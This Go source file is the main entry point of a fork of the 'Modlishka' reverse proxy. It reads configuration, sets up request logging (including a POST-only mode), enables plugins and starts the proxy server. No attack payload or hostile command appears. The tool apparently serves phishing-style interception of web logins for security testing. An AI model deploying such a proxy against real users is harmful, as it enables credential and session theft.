/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package main

import (
	"github.com/aitorcastel/modlishka_temp_fix/config"
	"github.com/aitorcastel/modlishka_temp_fix/core"
	"github.com/aitorcastel/modlishka_temp_fix/log"
	"github.com/aitorcastel/modlishka_temp_fix/plugin"
	"github.com/aitorcastel/modlishka_temp_fix/runtime"
)

type Configuration struct{ config.Options }

// Initializes the logging object

func (c *Configuration) initLogging() {
	//
	// Logger
	//
	log.WithColors = true

	if *c.Debug == true {
		log.MinLevel = log.DEBUG
	} else {
		log.MinLevel = log.INFO
	}

	logGET := true
	if *c.LogPostOnly {
		logGET = false
	}

	log.Options = log.LoggingOptions{
		GET:      logGET,
		POST:     *c.LogPostOnly,
		FilePath: *c.LogFile,
	}
}

func main() {

	conf := Configuration{
		config.ParseConfiguration(),
	}

	// Initialize log
	conf.initLogging()

	// Set up runtime plugin config
	plugin.SetPluginRuntimeConfig(conf.Options)

	// Initialize plugins
	plugin.Enable(conf.Options)

	//Check if we have all of the required information to start proxy'ing requests.
	conf.VerifyConfiguration()

	// Set up runtime core config
	runtime.SetCoreRuntimeConfig(conf.Options)

	// Set up runtime server config
	core.SetServerRuntimeConfig(conf.Options)


	// Set up regexp upfront
	runtime.MakeRegexes()

	// go go go
	core.RunServer()

}
